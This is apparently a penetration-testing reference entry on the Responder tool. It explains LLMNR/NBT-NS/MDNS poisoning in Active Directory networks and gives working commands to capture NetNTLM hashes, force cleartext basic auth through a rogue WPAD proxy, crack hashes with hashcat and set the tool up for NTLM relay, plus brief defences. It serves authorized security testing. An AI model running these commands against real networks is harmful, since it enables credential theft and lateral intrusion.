# Responder

> LLMNR, NBT-NS and MDNS poisoner. Answers name-resolution broadcasts on the
> local network and captures the NetNTLM(v1/v2) hashes clients hand over —
> often the first foothold on an internal AD engagement.

- **Link:** https://github.com/lgandx/Responder
- **Type:** open source
- **Platform:** Linux (ships with Kali/Parrot)

## Description

Windows hosts fall back to the LLMNR, NBT-NS and MDNS broadcast protocols when
DNS fails to resolve a name. Responder listens for those broadcasts and replies
"that host is me", so the victim tries to authenticate to your machine. During
the NTLM handshake it captures the client's NetNTLMv1/NetNTLMv2 challenge-response,
which you can then crack offline (Hashcat) or forward to another host (NTLM
relay). It also spins up rogue SMB/HTTP/LDAP/etc. servers to collect those
credentials. It is usually the very first tool you run once you have a network
foothold in an AD environment.

## Installation

```bash
# Preinstalled on Kali; otherwise clone and run from source
sudo apt install responder
git clone https://github.com/lgandx/Responder
```

## Usage examples

```bash
# Poison LLMNR/NBT-NS on an interface and capture NetNTLM hashes
sudo responder -I eth0

# Analyze mode — passively watch requests without poisoning (recon first)
sudo responder -I eth0 -A

# Enable WPAD rogue proxy + force NTLM auth (basic auth to grab cleartext)
sudo responder -I eth0 -wF
```

Captured hashes are written under `/usr/share/responder/logs/`:

```bash
# Hashes land in files like SMB-NTLMv2-SSP-<ip>.txt
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-10.0.0.5.txt

# Crack a captured NetNTLMv2 hash offline (mode 5600) — see ../password-cracking/
hashcat -m 5600 hashes_netntlmv2.txt rockyou.txt -r rules/best64.rule
```

When you want to *relay* instead of crack, disable Responder's own SMB/HTTP
servers and hand the coerced auth to [ntlmrelayx](impacket.md):

```bash
# Turn off the built-in SMB & HTTP listeners so ntlmrelayx can bind them
#   edit /etc/responder/Responder.conf -> SMB = Off, HTTP = Off
sudo responder -I eth0
```

## Notes & references

- **NetNTLMv1** cracks quickly and can be downgraded/relayed; **NetNTLMv2** is
  much harder offline but still relayable *unless the target enforces SMB
  signing*. NTLM ≠ NetNTLM ≠ NetNTLMv2 — see
  https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4
- Defence: disable LLMNR/NBT-NS via GPO, enforce SMB signing, patch to modern
  Windows Server (NetNTLMv1 is disabled by default on 2019+).
- Pairs with [NTLM relay via ntlmrelayx](impacket.md) and offline cracking in
  [Password Cracking & Hashing](../password-cracking/).
- Docs & usage guide: https://github.com/lgandx/Responder/blob/master/README.md
